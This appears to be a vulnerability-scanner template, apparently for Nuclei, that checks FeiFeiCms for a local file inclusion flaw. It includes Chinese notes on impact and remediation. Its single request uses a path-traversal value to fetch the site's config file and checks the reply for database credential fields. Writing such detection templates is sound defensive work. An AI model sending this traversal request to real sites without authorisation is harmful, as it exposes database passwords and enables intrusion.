id: feifeicms-lfr

info:
  name: FeiFeiCms - 本地文件包含漏洞
  author: princechaddha
  severity: high
  description: |
    该模板用于检测 FeiFeiCms - 本地文件包含漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/index.php?s=Admin-Data-down&id=../../Conf/config.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://www.cnblogs.com/jinqi520/p/10202615.html
    - https://gitee.com/daicuo/feifeicms
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: feifeicms,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "<?php"
          - "db_name"
          - "db_pwd"
          - "db_host"
        condition: and
        part: body
